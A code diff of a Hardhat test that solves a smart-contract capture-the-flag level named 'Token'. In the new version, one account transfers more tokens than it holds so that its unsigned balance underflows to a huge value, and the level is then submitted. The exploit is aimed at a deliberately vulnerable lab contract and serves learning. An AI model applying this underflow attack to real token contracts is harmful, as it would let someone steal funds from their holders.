@@ -1,5 +1,5 @@
 import { expect } from "chai";
-import { BigNumber, Contract, Signer } from "ethers";
+import { Contract, Signer } from "ethers";
 import { ethers } from "hardhat";
 import { createChallenge, submitLevel } from "./utils";
 
@@ -12,24 +12,28 @@ let tx: any;
 
 before(async () => {
   accounts = await ethers.getSigners();
-  [eoa, accomplice] = accounts;
+  eoa = accounts[0];
+  accomplice = accounts[1];
+  console.log('eoa: ', eoa.getAddress());
+  console.log('accomplice: ', accomplice.getAddress());
+  
   const challengeFactory = await ethers.getContractFactory(`Token`);
   const challengeAddress = await createChallenge(
-    `0x63bE8347A617476CA461649897238A31835a32CE`
+    `0x478f3476358Eb166Cb7adE4666d04fbdDB56C407`
   );
   challenge = await challengeFactory.attach(challengeAddress);
 });
 
 it("solves the challenge", async function () {
-  const eoaAddress = await eoa.getAddress();
+  const accompliceAddress = await accomplice.getAddress();
   // contract uses unsigned integer which is always >= 0, overflow check is useless
   tx = await challenge
-    .connect(accomplice)
+    .connect(eoa)
     // we start with 20 tokens, make sure eoa's balance doesn't overflow as well
-    .transfer(eoaAddress, BigNumber.from(`2`).pow(256).sub(`21`));
+    .transfer(accompliceAddress, 21n);
   await tx.wait();
 });
 
 after(async () => {
-  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
+  expect(await submitLevel(challenge.target), "level not solved").to.be.true;
 });
